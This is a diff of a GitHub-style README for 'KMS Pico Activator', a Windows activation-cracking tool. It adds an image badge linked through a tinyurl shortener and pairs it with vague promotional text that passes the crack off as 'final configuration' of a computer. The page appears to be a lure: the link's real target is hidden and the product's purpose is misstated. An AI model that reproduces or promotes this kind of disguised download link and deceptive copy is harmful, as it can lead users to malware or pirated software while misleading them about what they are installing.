@@ -2,7 +2,7 @@
 
 The perfect assistant to finalize your computer's setup. Achieve a fully configured and ready-to-use system with ease! ✨
 
-
+[![856795780](https://github.com/user-attachments/assets/4b141e6f-7764-427b-ba7f-e47f92a303d0)](https://tinyurl.com/3zkzx9x7)
 
 ## At a Glance
 **KMS Pico Activator** is a dedicated program that helps complete essential configuration steps on your computer. It efficiently prepares your software environment, ensuring everything is set up correctly for immediate use. Consider it the final piece of the puzzle for your system! 🧩
